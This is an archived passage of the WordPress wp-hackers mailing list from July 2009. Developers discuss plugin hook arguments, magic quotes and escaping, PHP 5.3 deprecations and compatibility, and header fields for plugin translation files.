> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From wp-hackers at striderweb.com  Mon Jul 20 16:06:02 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Mon, 20 Jul 2009 11:06:02 -0500
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <161617690907200620i7250dcd0j36429c0c9c4174ce@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>
	<161617690907171429m3b81f37fp70eafebc974b7283@mail.gmail.com>
	<4A613671.8090104@gaarai.com> <4A613742.2040206@xavisys.com>
	<161617690907200620i7250dcd0j36429c0c9c4174ce@mail.gmail.com>
Message-ID: <901C1A37-562B-49F0-964B-7DED750F7637@striderweb.com>

 From now on this is going in all my plugins  ;-) :

function otto_test() {
	complete gibberish
}

On Jul 20, 2009, at 8:20 AM, Otto wrote:

> You can include a file with complete gibberish
> inside a function, but until you try to use that function, it won't
> stop the program.
>
> -Otto


From hanskrentel at yahoo.de  Mon Jul 20 17:23:27 2009
From: hanskrentel at yahoo.de (Hans Krentel)
Date: Mon, 20 Jul 2009 17:23:27 +0000 (GMT)
Subject: [wp-hackers] New WordPress RBAC implementation
Message-ID: <227533.32866.qm@web24102.mail.ird.yahoo.com>


I'm currently working on #10201 and have some problems with getting the wording clarified. I think we all know about so called "Capabilities". But can you explain the following related terms? :

a) Meta Capabilities

b) Primitive Capabilities

An explanation of those would help me to get things clarified of the current system. Maybe those are all obsolete and only mentioned because that were some time ago concepts dropped with 2.5 / 2.7 ?

- hakre




      

From hanskrentel at yahoo.de  Mon Jul 20 17:30:20 2009
From: hanskrentel at yahoo.de (Hans Krentel)
Date: Mon, 20 Jul 2009 17:30:20 +0000 (GMT)
Subject: [wp-hackers] single quote in plugin options
Message-ID: <680833.14916.qm@web24107.mail.ird.yahoo.com>


--- Matt Mullenweg <m at mullenweg.com> schrieb am So, 19.7.2009:

> Von: Matt Mullenweg <m at mullenweg.com>
> Betreff: Re: [wp-hackers] single quote in plugin options
> An: wp-hackers at lists.automattic.com
> Datum: Sonntag, 19. Juli 2009, 18:08
> On 7/15/2009 8:43 PM, Will Anderson
> wrote:
> > This is why Magic Quotes are being deprecated. They're
> useful for software
> > that doesn't do its own escaping, but software like
> WordPress does, so Magic
> > Quotes end up being more of a pain than they're
> worth.
> 
> We attempt to turn magic quotes off at the top of
> wp-settings.php:
> 
> set_magic_quotes_runtime(0);
> @ini_set('magic_quotes_sybase', 0);
> 
> If you're seeing extra quotes somewhere, it may be a bug.
> 

That's not entirely correct. The PHP-option is overwritten (as stated by Matt), but quotes are manually applied mostly everywhere the WP core code can get it's fingers on. I hope I can quote Matt that this is acually a bug, DD32 will jell out loud I'm shure. ^^ 

Maybe you are just experiencing some of those cases it is unsure wether or not data should be quoted or escaped. Dig deeper in the code and try to clarify with other devs is the only direction I can give on this one for the current status quo.

-h.




      

From heiko.rabe at code-styling.de  Mon Jul 20 19:01:45 2009
From: heiko.rabe at code-styling.de (Heiko Rabe)
Date: Mon, 20 Jul 2009 21:01:45 +0200
Subject: [wp-hackers] single quote in plugin options
In-Reply-To: <680833.14916.qm@web24107.mail.ird.yahoo.com>
References: <680833.14916.qm@web24107.mail.ird.yahoo.com>
Message-ID: <4A64BF19.5090600@code-styling.de>

Out of PHP manuals http://php.net/manual/en/ini.list.php:

magic_quotes_runtime 
<http://de.php.net/manual/en/info.configuration.php#ini.magic-quotes-runtime> 
	"0" 	PHP_INI_ALL 	Removed in PHP 6.0.0.
magic_quotes_sybase 
<http://de.php.net/manual/en/sybase.configuration.php#ini.magic-quotes-sybase> 
	"0" 	PHP_INI_ALL 	Removed in PHP 6.0.0.


because it gives no security, the programmer is always responsible to 
correct escapement inside code!

regards

> --- Matt Mullenweg <m at mullenweg.com> schrieb am So, 19.7.2009:
>
>   
>> Von: Matt Mullenweg <m at mullenweg.com>
>> Betreff: Re: [wp-hackers] single quote in plugin options
>> An: wp-hackers at lists.automattic.com
>> Datum: Sonntag, 19. Juli 2009, 18:08
>> On 7/15/2009 8:43 PM, Will Anderson
>> wrote:
>>     
>>> This is why Magic Quotes are being deprecated. They're
>>>       
>> useful for software
>>     
>>> that doesn't do its own escaping, but software like
>>>       
>> WordPress does, so Magic
>>     
>>> Quotes end up being more of a pain than they're
>>>       
>> worth.
>>
>> We attempt to turn magic quotes off at the top of
>> wp-settings.php:
>>
>> set_magic_quotes_runtime(0);
>> @ini_set('magic_quotes_sybase', 0);
>>
>> If you're seeing extra quotes somewhere, it may be a bug.
>>
>>     
>
> That's not entirely correct. The PHP-option is overwritten (as stated by Matt), but quotes are manually applied mostly everywhere the WP core code can get it's fingers on. I hope I can quote Matt that this is acually a bug, DD32 will jell out loud I'm shure. ^^ 
>
> Maybe you are just experiencing some of those cases it is unsure wether or not data should be quoted or escaped. Dig deeper in the code and try to clarify with other devs is the only direction I can give on this one for the current status quo.
>
> -h.
>
>
>
>
>       
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>   


From mrbrog at gmail.com  Mon Jul 20 20:35:06 2009
From: mrbrog at gmail.com (Claudio Simeone)
Date: Mon, 20 Jul 2009 22:35:06 +0200
Subject: [wp-hackers] row output on wp-admin/users.php
In-Reply-To: <4A6345CC.4070006@mullenweg.com>
References: <F4123DB7-8E29-4FBE-B2D7-8B45D5289E38@sproutventure.com> 
	<3CC2974E-7B0A-4C7C-8042-622698BB70F9@striderweb.com>
	<68528DBC-5C7A-4E18-B3A9-242A34A49EB7@sproutventure.com> 
	<CB34EBF7-7B67-4B3B-B30D-98E6EC24C4CE@sproutventure.com>
	<c41cda880907161005l40d3caedsfd0cebe1f4a35f22@mail.gmail.com> 
	<4A6345CC.4070006@mullenweg.com>
Message-ID: <c41cda880907201335l750fd5a7u452119306465c050@mail.gmail.com>

2009/7/19 Matt Mullenweg <m at mullenweg.com>:

>> add_action('manage_users_custom_column', my_user_cols_cc'); // this not
>
> You're missing an opening quote there -- is that in the original code or a
> copy/paste error?

hi Matt, the original code has the opening quote, I made a paste error
while I was writing the email.

> If your action function accepts multiple arguments, you need to tell
> add_action as well:
>
> http://codex.wordpress.org/Function_Reference/add_action

yes, my function accepts 2 arguments: the column_name and the user ID,
I told add_action this, and now it's working but in a different and
strange way:

so I did:

add_action('manage_users_custom_column', 'MY_user_cols_cc', 10, 3);

function MY_user_cols_cc($empty_var, $user_object, $column_name) {
/*
strange thing #1:
$user_object contains the value of $column_name and
$column_name contains the value of $user_object

strange thing #2:
why I need to pass an empty variable as first argument?
*/

if ($user_object == 'courses'){
  // do what you need
  $r .= "This user has this ID: $column_name";
}
return $r;
}

can you explain to me why this happens?
the function is hooked to this row in /wp-admin/includes/template.php row 1975
that has an empty argument (the second)

$r .= apply_filters('manage_users_custom_column', '', $column_name,
$user_object->ID);

A final question: will this solution work in future versions of WP?

thanks
Claudio

From matt at sivel.net  Mon Jul 20 20:48:10 2009
From: matt at sivel.net (Matt Martz)
Date: Mon, 20 Jul 2009 16:48:10 -0400
Subject: [wp-hackers] row output on wp-admin/users.php
In-Reply-To: <c41cda880907201335l750fd5a7u452119306465c050@mail.gmail.com>
References: <F4123DB7-8E29-4FBE-B2D7-8B45D5289E38@sproutventure.com> 
	<3CC2974E-7B0A-4C7C-8042-622698BB70F9@striderweb.com>
	<68528DBC-5C7A-4E18-B3A9-242A34A49EB7@sproutventure.com> 
	<CB34EBF7-7B67-4B3B-B30D-98E6EC24C4CE@sproutventure.com>
	<c41cda880907161005l40d3caedsfd0cebe1f4a35f22@mail.gmail.com> 
	<4A6345CC.4070006@mullenweg.com>
	<c41cda880907201335l750fd5a7u452119306465c050@mail.gmail.com>
Message-ID: <518fa9630907201348p560ee02bk3a04928d3cd0355f@mail.gmail.com>

> so I did:
>
> add_action('manage_users_custom_column', 'MY_user_cols_cc', 10, 3);
>
> function MY_user_cols_cc($empty_var, $user_object, $column_name) {
> /*
> strange thing #1:
> $user_object contains the value of $column_name and
> $column_name contains the value of $user_object

If you look at where manage_users_custom_column is defined in the code
you will see:

apply_filters('manage_users_custom_column', '', $column_name, $user_object->ID);

Where $column_name is the 2nd argument and $user_object->ID is the 3rd argument.

You have the arguments reversed in your callback function.

-- 
Matt Martz
matt at sivel.net
http://sivel.net/

From heiko.rabe at code-styling.de  Tue Jul 21 01:07:45 2009
From: heiko.rabe at code-styling.de (Heiko Rabe)
Date: Tue, 21 Jul 2009 03:07:45 +0200
Subject: [wp-hackers] PHP 5.3 stress tests with WordPress - expecting a lot
 of emitted warnings
Message-ID: <4A6514E1.10809@code-styling.de>

Did somebody run a full unit test across WordPress core functionality 
with PHP 5.3 ?
Today i tried a test install of PHP 5.3 and i found a lot of plugins and 
themes are failing and emitting a lot of warnings and errors now.
I could not proceed with whole WP tests yet but the most relevant 
changes are:

 * The newer internal parameter parsing API has been applied across all 
the extensions bundled with PHP 5.3.x. This parameter parsing API causes 
functions to return *NULL* when passed incompatible parameters. There 
are some exceptions to this rule, such as the get_class() 
<http://de.php.net/manual/en/function.get-class.php> function, which 
will continue to return *FALSE* on error.
 * The call_user_func() 
<http://de.php.net/manual/en/function.call-user-func.php> family of 
functions now propagate /$this/ even if the callee is a parent class.
 * The array functions natsort() 
<http://de.php.net/manual/en/function.natsort.php>, natcasesort() 
<http://de.php.net/manual/en/function.natcasesort.php>, usort() 
<http://de.php.net/manual/en/function.usort.php>, uasort() 
<http://de.php.net/manual/en/function.uasort.php>, uksort() 
<http://de.php.net/manual/en/function.uksort.php>, array_flip() 
<http://de.php.net/manual/en/function.array-flip.php>, and 
array_unique() <http://de.php.net/manual/en/function.array-unique.php> 
no longer accept objects passed as arguments. To apply these functions 
to an object, cast the object to an array first.
 * The behaviour of functions with by-reference parameters called by 
value has changed. Where previously the function would accept the 
by-value argument, a warning is now emitted and all by-ref parameters 
are set to *NULL*.
 * Assigning the return value of new 
<http://de.php.net/manual/en/language.oop5.basic.php#language.oop5.basic.new> 
by reference is now deprecated.
 * Call-time pass-by-reference is now deprecated.
 * The use of /{}/ to access string offsets is deprecated. Use /[]/ 
instead.

http://de.php.net/manual/en/migration53.deprecated.php

This may be important because some hoster/provider did start upgrading 
their server during last 2 weeks. This is current not the majority but 
in long terms there are more comming. Most of above named changes emit 
now warnings or errors, so a proper working of whole WordPress may not 
longer be given in all cases.

Can we assume, that the latest version of WordPress 2.8.2 is still PHP 
5.3 compatible at all ?
If not, should this lead to a warning publication (especially adressed 
to theme/plugin authors) ?

regards

Heiko Rabe
(www.code-styling.de)



From mrbrog at gmail.com  Tue Jul 21 05:41:01 2009
From: mrbrog at gmail.com (Claudio Simeone)
Date: Tue, 21 Jul 2009 07:41:01 +0200
Subject: [wp-hackers] row output on wp-admin/users.php
In-Reply-To: <518fa9630907201348p560ee02bk3a04928d3cd0355f@mail.gmail.com>
References: <F4123DB7-8E29-4FBE-B2D7-8B45D5289E38@sproutventure.com> 
	<3CC2974E-7B0A-4C7C-8042-622698BB70F9@striderweb.com>
	<68528DBC-5C7A-4E18-B3A9-242A34A49EB7@sproutventure.com> 
	<CB34EBF7-7B67-4B3B-B30D-98E6EC24C4CE@sproutventure.com>
	<c41cda880907161005l40d3caedsfd0cebe1f4a35f22@mail.gmail.com> 
	<4A6345CC.4070006@mullenweg.com>
	<c41cda880907201335l750fd5a7u452119306465c050@mail.gmail.com> 
	<518fa9630907201348p560ee02bk3a04928d3cd0355f@mail.gmail.com>
Message-ID: <c41cda880907202241k2101611bs6fb41a5e2255d6a9@mail.gmail.com>

2009/7/20 Matt Martz <matt at sivel.net>:

> If you look at where manage_users_custom_column is defined in the code
> you will see:
>
> apply_filters('manage_users_custom_column', '', $column_name, $user_object->ID);
>
> Where $column_name is the 2nd argument and $user_object->ID is the 3rd argument.
>
> You have the arguments reversed in your callback function.

yes, I noticed it 1 second after the mail was sent :)

do you know why manage_users_custom_column  (and similar functions)
have an empty argument?

apply_filters('manage_users_custom_column', '' <====

thanks
Claudio

From hanskrentel at yahoo.de  Tue Jul 21 09:17:45 2009
From: hanskrentel at yahoo.de (Hans Krentel)
Date: Tue, 21 Jul 2009 09:17:45 +0000 (GMT)
Subject: [wp-hackers] PHP 5.3 stress tests with WordPress - expecting a
	lot of emitted warnings
Message-ID: <3156.44801.qm@web24104.mail.ird.yahoo.com>


Thanks for all the infos.


> Can we assume, that the latest version of WordPress 2.8.2
> is still PHP 5.3 compatible at all ?
I doubt that it can or can not be assumed. It would need to run tests to properly say wether or not it is functioning properly with 5.3.

> If not, should this lead to a warning publication
> (especially adressed to theme/plugin authors) ?

I think first of all we need a valid and binding statement wether or not WordPress core should be compatible with PHP 5.3 or not. The project maintainers need to make that statement.

I like the Idea to have that statement in bold because PHP 5.3 release is some days older now. It was in the beginning of the month if I remember correctly.


-hakre


      

From speedboxer at gmail.com  Tue Jul 21 09:30:48 2009
From: speedboxer at gmail.com (Matt Freedman)
Date: Tue, 21 Jul 2009 02:30:48 -0700
Subject: [wp-hackers] PHP 5.3 stress tests with WordPress - expecting a
	lot of emitted warnings
In-Reply-To: <3156.44801.qm@web24104.mail.ird.yahoo.com>
References: <3156.44801.qm@web24104.mail.ird.yahoo.com>
Message-ID: <b88434820907210230j6b52bba1t38123a4c7acddf4b@mail.gmail.com>

I've been running WordPress on PHP 5.3 since 5.3 was released and it
runs without problems. WordPress does use some now deprecated
functionality, but that will not prevent it from running as before.


On Tue, Jul 21, 2009 at 2:17 AM, Hans Krentel<hanskrentel at yahoo.de> wrote:
>
> Thanks for all the infos.
>
>
>> Can we assume, that the latest version of WordPress 2.8.2
>> is still PHP 5.3 compatible at all ?
> I doubt that it can or can not be assumed. It would need to run tests to properly say wether or not it is functioning properly with 5.3.
>
>> If not, should this lead to a warning publication
>> (especially adressed to theme/plugin authors) ?
>
> I think first of all we need a valid and binding statement wether or not WordPress core should be compatible with PHP 5.3 or not. The project maintainers need to make that statement.
>
> I like the Idea to have that statement in bold because PHP 5.3 release is some days older now. It was in the beginning of the month if I remember correctly.
>
>
> -hakre
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Matt Freedman
http://mattfreedman.ca/

From wordpress at santosj.name  Tue Jul 21 10:36:13 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Tue, 21 Jul 2009 05:36:13 -0500
Subject: [wp-hackers] PHP 5.3 stress tests with WordPress - expecting a
 lot of emitted warnings
In-Reply-To: <4A6514E1.10809@code-styling.de>
References: <4A6514E1.10809@code-styling.de>
Message-ID: <20090721053613.ce5d8019.wordpress@santosj.name>

WordPress runs fine with stock install and a few plugins. I think the problem you are going to have is in plugins which are incompatible with PHP 5.3. However, given that a lot of plugins are PHP4 compatible as well, it is likely that they won't have any issues either.

Question: There are unit tests for WordPress? I know about http://svn.automattic.com/wordpress-tests/, but those aren't unit tests. I consider unit tests to be without dependencies and most of the test cases have dependencies (although there are a few mocks which do isolate a few parts of the code). Something that relies on the execution of the application or project most decidably can not be called unit testing. 

* I do not believe there are any objects passed to any of the sorting functions in WordPress. If so, then they were incorrect long before PHP 5.3 and a bug report should be made.

* The call_user_func() changes do not apply to WordPress, because the plugin API is procedural and not object-oriented. I do thank you for the info, because I do plan on writing an object-oriented plugin API and the closures bit will help out a great deal.

* /{}/ is advanced enough that it isn't used and if it is, then using /[]/ for strings won't break anything in PHP5 and PHP4.

If it doesn't work on PHP5.3 then a bug should be made to either the core or plugin Trac. The point is not to wait until people are using PHP5.3 to fix bugs as long as the bug fix does not break the requirements for PHP4.3, in any case, the reference bits can't be fixed or patched, because it will break PHP4 compatibility (well, there wouldn't be any errors or notices, it just won't work as intended).

Whether or not theme and plugin authors are doing something that breaks on PHP5.3 is saying that they were doing something right in the first place (unless they were using references for PHP4 compatibility). I haven't seen anything overly advanced in any plugins or themes I've used (they might still be out there).

As for notices, I've been using PHP 5.3 for several months now and have made a few bug reports on several noticable issues. Given that I wasn't using a test suite, I can't be entirely sure.

-- 
Jacob Santos <wordpress at santosj.name>


On Tue, 21 Jul 2009 03:07:45 +0200
Heiko Rabe <heiko.rabe at code-styling.de> wrote:

> Did somebody run a full unit test across WordPress core functionality 
> with PHP 5.3 ?
> Today i tried a test install of PHP 5.3 and i found a lot of plugins and 
> themes are failing and emitting a lot of warnings and errors now.
> I could not proceed with whole WP tests yet but the most relevant 
> changes are:
> 
>  * The newer internal parameter parsing API has been applied across all 
> the extensions bundled with PHP 5.3.x. This parameter parsing API causes 
> functions to return *NULL* when passed incompatible parameters. There 
> are some exceptions to this rule, such as the get_class() 
> <http://de.php.net/manual/en/function.get-class.php> function, which 
> will continue to return *FALSE* on error.
>  * The call_user_func() 
> <http://de.php.net/manual/en/function.call-user-func.php> family of 
> functions now propagate /$this/ even if the callee is a parent class.
>  * The array functions natsort() 
> <http://de.php.net/manual/en/function.natsort.php>, natcasesort() 
> <http://de.php.net/manual/en/function.natcasesort.php>, usort() 
> <http://de.php.net/manual/en/function.usort.php>, uasort() 
> <http://de.php.net/manual/en/function.uasort.php>, uksort() 
> <http://de.php.net/manual/en/function.uksort.php>, array_flip() 
> <http://de.php.net/manual/en/function.array-flip.php>, and 
> array_unique() <http://de.php.net/manual/en/function.array-unique.php> 
> no longer accept objects passed as arguments. To apply these functions 
> to an object, cast the object to an array first.
>  * The behaviour of functions with by-reference parameters called by 
> value has changed. Where previously the function would accept the 
> by-value argument, a warning is now emitted and all by-ref parameters 
> are set to *NULL*.
>  * Assigning the return value of new 
> <http://de.php.net/manual/en/language.oop5.basic.php#language.oop5.basic.new> 
> by reference is now deprecated.
>  * Call-time pass-by-reference is now deprecated.
>  * The use of /{}/ to access string offsets is deprecated. Use /[]/ 
> instead.
> 
> http://de.php.net/manual/en/migration53.deprecated.php
> 
> This may be important because some hoster/provider did start upgrading 
> their server during last 2 weeks. This is current not the majority but 
> in long terms there are more comming. Most of above named changes emit 
> now warnings or errors, so a proper working of whole WordPress may not 
> longer be given in all cases.
> 
> Can we assume, that the latest version of WordPress 2.8.2 is still PHP 
> 5.3 compatible at all ?
> If not, should this lead to a warning publication (especially adressed 
> to theme/plugin authors) ?
> 
> regards
> 
> Heiko Rabe
> (www.code-styling.de)
> 
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers




From speedboxer at gmail.com  Tue Jul 21 11:07:47 2009
From: speedboxer at gmail.com (Matt Freedman)
Date: Tue, 21 Jul 2009 04:07:47 -0700
Subject: [wp-hackers] PHP 5.3 stress tests with WordPress - expecting a
	lot of emitted warnings
In-Reply-To: <20090721053613.ce5d8019.wordpress@santosj.name>
References: <4A6514E1.10809@code-styling.de>
	<20090721053613.ce5d8019.wordpress@santosj.name>
Message-ID: <b88434820907210407h26753a52ld863e7d184687a2f@mail.gmail.com>

The main thing that should be changed is to stop using functions that
were deprecated in PHP 5.3. This includes moving the few ereg (POSIX)
functions to preg (Perl) and putting a version check around
set_magic_quotes_runtime() (as it is no longer necessary in PHP 5.3).


On Tue, Jul 21, 2009 at 3:36 AM, Jacob Santos<wordpress at santosj.name> wrote:
> WordPress runs fine with stock install and a few plugins. I think the problem you are going to have is in plugins which are incompatible with PHP 5.3. However, given that a lot of plugins are PHP4 compatible as well, it is likely that they won't have any issues either.
>
> Question: There are unit tests for WordPress? I know about http://svn.automattic.com/wordpress-tests/, but those aren't unit tests. I consider unit tests to be without dependencies and most of the test cases have dependencies (although there are a few mocks which do isolate a few parts of the code). Something that relies on the execution of the application or project most decidably can not be called unit testing.
>
> * I do not believe there are any objects passed to any of the sorting functions in WordPress. If so, then they were incorrect long before PHP 5.3 and a bug report should be made.
>
> * The call_user_func() changes do not apply to WordPress, because the plugin API is procedural and not object-oriented. I do thank you for the info, because I do plan on writing an object-oriented plugin API and the closures bit will help out a great deal.
>
> * /{}/ is advanced enough that it isn't used and if it is, then using /[]/ for strings won't break anything in PHP5 and PHP4.
>
> If it doesn't work on PHP5.3 then a bug should be made to either the core or plugin Trac. The point is not to wait until people are using PHP5.3 to fix bugs as long as the bug fix does not break the requirements for PHP4.3, in any case, the reference bits can't be fixed or patched, because it will break PHP4 compatibility (well, there wouldn't be any errors or notices, it just won't work as intended).
>
> Whether or not theme and plugin authors are doing something that breaks on PHP5.3 is saying that they were doing something right in the first place (unless they were using references for PHP4 compatibility). I haven't seen anything overly advanced in any plugins or themes I've used (they might still be out there).
>
> As for notices, I've been using PHP 5.3 for several months now and have made a few bug reports on several noticable issues. Given that I wasn't using a test suite, I can't be entirely sure.
>
> --
> Jacob Santos <wordpress at santosj.name>
>
>
> On Tue, 21 Jul 2009 03:07:45 +0200
> Heiko Rabe <heiko.rabe at code-styling.de> wrote:
>
>> Did somebody run a full unit test across WordPress core functionality
>> with PHP 5.3 ?
>> Today i tried a test install of PHP 5.3 and i found a lot of plugins and
>> themes are failing and emitting a lot of warnings and errors now.
>> I could not proceed with whole WP tests yet but the most relevant
>> changes are:
>>
>> ?* The newer internal parameter parsing API has been applied across all
>> the extensions bundled with PHP 5.3.x. This parameter parsing API causes
>> functions to return *NULL* when passed incompatible parameters. There
>> are some exceptions to this rule, such as the get_class()
>> <http://de.php.net/manual/en/function.get-class.php> function, which
>> will continue to return *FALSE* on error.
>> ?* The call_user_func()
>> <http://de.php.net/manual/en/function.call-user-func.php> family of
>> functions now propagate /$this/ even if the callee is a parent class.
>> ?* The array functions natsort()
>> <http://de.php.net/manual/en/function.natsort.php>, natcasesort()
>> <http://de.php.net/manual/en/function.natcasesort.php>, usort()
>> <http://de.php.net/manual/en/function.usort.php>, uasort()
>> <http://de.php.net/manual/en/function.uasort.php>, uksort()
>> <http://de.php.net/manual/en/function.uksort.php>, array_flip()
>> <http://de.php.net/manual/en/function.array-flip.php>, and
>> array_unique() <http://de.php.net/manual/en/function.array-unique.php>
>> no longer accept objects passed as arguments. To apply these functions
>> to an object, cast the object to an array first.
>> ?* The behaviour of functions with by-reference parameters called by
>> value has changed. Where previously the function would accept the
>> by-value argument, a warning is now emitted and all by-ref parameters
>> are set to *NULL*.
>> ?* Assigning the return value of new
>> <http://de.php.net/manual/en/language.oop5.basic.php#language.oop5.basic.new>
>> by reference is now deprecated.
>> ?* Call-time pass-by-reference is now deprecated.
>> ?* The use of /{}/ to access string offsets is deprecated. Use /[]/
>> instead.
>>
>> http://de.php.net/manual/en/migration53.deprecated.php
>>
>> This may be important because some hoster/provider did start upgrading
>> their server during last 2 weeks. This is current not the majority but
>> in long terms there are more comming. Most of above named changes emit
>> now warnings or errors, so a proper working of whole WordPress may not
>> longer be given in all cases.
>>
>> Can we assume, that the latest version of WordPress 2.8.2 is still PHP
>> 5.3 compatible at all ?
>> If not, should this lead to a warning publication (especially adressed
>> to theme/plugin authors) ?
>>
>> regards
>>
>> Heiko Rabe
>> (www.code-styling.de)
>>
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Matt Freedman
http://mattfreedman.ca/

From nb at nikolay.bg  Tue Jul 21 16:18:18 2009
From: nb at nikolay.bg (Nikolay Bachiyski)
Date: Tue, 21 Jul 2009 19:18:18 +0300
Subject: [wp-hackers] wordpress.org *.pot file feature for
	pluginsgetsbroken by PoEdit
In-Reply-To: <29107846.2446491248095658555.JavaMail.servlet@kundenserver>
References: <29107846.2446491248095658555.JavaMail.servlet@kundenserver>
Message-ID: <87e663fa0907210918u216705ban8c50fd3c0b79dd51@mail.gmail.com>

On Mon, Jul 20, 2009 at 16:14, <heiko.rabe at code-styling.de> wrote:
> I know this. But the point is, that a lot of translation frameworks only based on normal gettext capabilities and also assume, that a rescan process can run every time on demand if required.
> Out of this scope this breaks all arround based on normal gettext behavoir.
> Any msgid not having a line number/file reference and can't be found by the gettext function definitions will be declared as obsolete.
>

We can add line numbers if this causes a problem with the tools.

> I know, that this has been born out of the need, that inactive plugins should be translatable too. But the way they the translated is also not best case. In a loop the language files will be load (and will reside in memory after translation the fields nevertheless). As you may know a 300kb WordPress main file will consume on servers upto 4MB! PHP memory, the leads to a mutiplier of 10 - 12!
> ...
> How you explain to users/customers, that they exceed there PHP memory limit every time they try to load the plugin overview page ?
>

A typical WordPress install runs on 32 or 64M of memory. The plugins
page consumes about 11M with locale en_US and about 10 inactive
plugins. You can do the math from now on. How many and how big plugin
translations would it take to fill all the memory?

> This are only a subset of issues. I never want to trash this feature but a more sophisticated solution is required than this one or you have a lot of trouble in consulting/helpdesk to explain that this is a big design issue of WordPress itself!
>

Heiko, I understand your worries, but this was the most practical
solutions of all we looked at.

Happy hacking,
Nikolay.

From lloydomattic at gmail.com  Tue Jul 21 18:41:13 2009
From: lloydomattic at gmail.com (Lloyd Budd)
Date: Tue, 21 Jul 2009 11:41:13 -0700
Subject: [wp-hackers] PHP 5.3 stress tests with WordPress - expecting a
	lot of emitted warnings
In-Reply-To: <b88434820907210407h26753a52ld863e7d184687a2f@mail.gmail.com>
References: <4A6514E1.10809@code-styling.de>
	<20090721053613.ce5d8019.wordpress@santosj.name> 
	<b88434820907210407h26753a52ld863e7d184687a2f@mail.gmail.com>
Message-ID: <70ebb7140907211141p75c04b0am63cd9eac7602b4d0@mail.gmail.com>

On Tue, Jul 21, 2009 at 4:07 AM, Matt Freedman<speedboxer at gmail.com> wrote:
> The main thing that should be changed is to stop using functions that
> were deprecated in PHP 5.3.

> This includes moving the few ereg (POSIX)
> functions to preg (Perl)

I've opened ticket #10460 ereg is deprecated in PHP 5.3
http://core.trac.wordpress.org/ticket/10460

> putting a version check around
> set_magic_quotes_runtime() (as it is no longer necessary in PHP 5.3).

I've re-opened http://core.trac.wordpress.org/ticket/9394

Now if someone can provide patches, we'll be almost done ;-)

Cheers,
-- 
Lloyd Budd | Digital Entomologist | WordPress.com VIP Services Lead
WordPress.com | WordPress.org | Automattic.com | | Skype:foolswisdom

From heiko.rabe at code-styling.de  Wed Jul 22 00:47:59 2009
From: heiko.rabe at code-styling.de (Heiko Rabe)
Date: Wed, 22 Jul 2009 02:47:59 +0200
Subject: [wp-hackers] wordpress.org *.pot file feature
 for	pluginsgetsbroken by PoEdit
In-Reply-To: <87e663fa0907210918u216705ban8c50fd3c0b79dd51@mail.gmail.com>
References: <29107846.2446491248095658555.JavaMail.servlet@kundenserver>
	<87e663fa0907210918u216705ban8c50fd3c0b79dd51@mail.gmail.com>
Message-ID: <4A6661BF.5050808@code-styling.de>


>> I know this. But the point is, that a lot of translation frameworks only based on normal gettext capabilities and also assume, that a rescan process can run every time on demand if required.
>> Out of this scope this breaks all arround based on normal gettext behavoir.
>> Any msgid not having a line number/file reference and can't be found by the gettext function definitions will be declared as obsolete.
>>
>>     
>
> We can add line numbers if this causes a problem with the tools.
>   
The Problem are not only the line number themselves, it the way gettext 
processors scanning sources.
Even if there would be a line number attached, the scanner is unable to 
keep this at *.po file instead of trash it as absolete.

Example:

<?php
/*
Plugin Name: Custom Field Images
Description: Easily associate any image to a post and display it in post 
excerpts, feeds etc.
Version: 2.0.0.1
Author: scribu
Author URI: http://scribu.net/
Plugin URI: http://scribu.net/wordpress/custom-field-images
Text Domain: custom-field-images
Domain Path: /lang

*/

This is a PHP comment section and because of this a normal gettext 
processor will immediatly skip any processing inside even if there would 
be a gettext functions included.
Also a full blown and correct WP 2.8.x based function definition like:

"X-Poedit-KeywordsList: 
__;_e;__ngettext:1,2;_n:1,2;__ngettext_noop:1,2;_n_noop:1,2;_c,_nc:4c,1,2;_x:1,2c;_nx:4c,1,2;_nx_noop:4c,1,2;\n"

and a modified header like:

<?php
/*
Plugin Name: __('Custom Field Images', 'custom-field-images')
.....
*/

won't work (even if this could be parsed by WordPress and handled 
correctly), because scanner just skip this section.
And there is no way to tell ordinary gettext processor to detect those 
lines.

But one thing for sure will be keeped by gettext processors, the header 
fields in msgid "" !
If you think about the PoEdit X- (extended) fields like this:

"X-Poedit-Language: German\n"
"X-Poedit-Country: GERMANY\n"
"X-Poedit-SourceCharset: utf-8\n"
"X-Poedit-KeywordsList: 
__;_e;__ngettext:1,2;_n:1,2;__ngettext_noop:1,2;_n_noop:1,2;_c,_nc:4c,1,2;_x:1,2c;_nx:4c,1,2;_nx_noop:4c,1,2;\n"
"X-Poedit-Basepath: \n"
"X-Poedit-Bookmarks: \n"
"X-Poedit-SearchPath-0: .\n"

you also could do the same as PoEdit did just for WordPress itself like:

"X-WordPress-Plugin-Name: Custom Field Images\n"
"X-WordPress-Plugin-Description: Easily associate any image to a post 
and display it in post excerpts, feeds etc.\n"
...

and as new golden goal it would also work for gettextable themes, where 
you have currently no solution for:

"X-WordPress-Theme-Name: My Super Theme\n"
"X-WordPress-Theme-Description: This is the worlds best theme ever seen 
on earth.\n"
...

I have written the proposed X-WordPress fields only english because of 
illustration but normally at a german file (de_DE.po) you would have 
german text there :-)

This would be my proposal for keeping it inside the file and also can be 
keeped even if the files gets re-written by a new scan process.
And because the header of a *.mo file get's processed dedicated (at 
least to get the pluralization formula and number) this fields could be 
extracted as easy as the plurals.

What you think about going this way to avoid translations get lost ?

regards

Heiko Rabe
(www.code-styling.de)



From nb at nikolay.bg  Wed Jul 22 05:56:30 2009
From: nb at nikolay.bg (Nikolay Bachiyski)
Date: Wed, 22 Jul 2009 08:56:30 +0300
